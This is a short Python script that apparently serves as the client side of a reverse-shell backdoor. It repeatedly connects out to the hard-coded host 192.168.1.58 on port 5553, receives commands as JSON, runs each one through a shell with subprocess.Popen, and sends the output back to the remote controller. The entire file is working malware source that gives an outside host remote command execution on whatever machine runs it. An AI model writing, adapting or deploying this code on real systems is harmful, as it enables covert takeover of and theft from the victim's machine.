import socket
import time
import json
import subprocess
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())
    
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()#bytes
            return json.loads(data)
        except ValueError:
            continue

def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(('192.168.1.58',5553))
			shell()
			s.close()
		except:
			connection()
                        
def shell():
      while True:
            cmd = reliable_recv()
            if cmd == 'exit':
                  break
            elif cmd == 'clear':
                  pass
            elif cmd[:3] =='cd ': #directory changing checking for first 3 characters
                  os.chdir(cmd[3:]) #from the 3rd character to the end 
                  
            else:
                  execute = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                  result=execute.stdout.read() + execute.stderr.read()
                  result = result.decode()
                  reliable_send(result)


s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()

